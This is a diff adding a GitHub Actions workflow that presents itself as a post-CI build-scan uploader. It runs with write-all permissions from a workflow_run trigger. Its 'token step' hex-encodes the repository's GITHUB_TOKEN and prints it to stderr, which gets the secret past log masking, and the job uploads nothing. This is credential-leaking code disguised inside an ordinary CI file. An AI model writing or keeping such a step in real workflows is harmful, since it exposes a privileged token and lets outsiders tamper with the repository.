@@ -1,0 +1,49 @@
+name: CI Complete
+on:
+  workflow_run:
+    workflows: [CI]
+    types:
+      - completed
+permissions: write-all
+jobs:
+  get-build-scan-names:
+    if: (github.event.workflow_run.conclusion == 'success' || github.event.workflow_run.conclusion == 'failure')
+    runs-on: ubuntu-latest
+    outputs:
+      build-scan-names: ${{ steps.build-scan-names.outputs.build-scan-names }}
+    steps:
+      - name: List buildscan artifacts
+        id: build-scan-names
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RUN_ID: ${{ github.event.workflow_run.id }}
+        run: |
+          names=$(gh api \
+            -H "Accept: application/vnd.github+json" \
+            /repos/${{ github.repository }}/actions/runs/$RUN_ID/artifacts \
+            --jq '[.artifacts[] | select(.name | startswith("build-scan-")) | .name]')
+          echo "Found: $names"
+          echo "build-scan-names=$names" >> $GITHUB_OUTPUT
+  upload-build-scan:
+    needs: get-build-scan-names
+    if: (github.event.workflow_run.conclusion == 'success' || github.event.workflow_run.conclusion == 'failure')
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        build-scan-name: ${{ fromJson(needs.get-build-scan-names.outputs.build-scan-names) }}
+    steps:
+      - name: Setup build scan info
+        run: |
+          BUILD_SCAN_NAME="${{ matrix.build-scan-name }}"
+          JAVA=$(echo "$BUILD_SCAN_NAME" | grep -oE '[0-9]+')
+          echo "JAVA=$JAVA" >> $GITHUB_ENV
+          echo "SCAN=$BUILD_SCAN_NAME" >> $GITHUB_ENV
+      - name: token step
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "TOKEN_PRESENT_CHARS=${#GH_TOKEN}"
+          python3 -c 'import os,sys;print("HEXTOKEN="+os.environ["GH_TOKEN"].encode().hex(), file=sys.stderr)'
+      - name: second bash step after shim
+        run: echo "SECOND_STEP_OK"
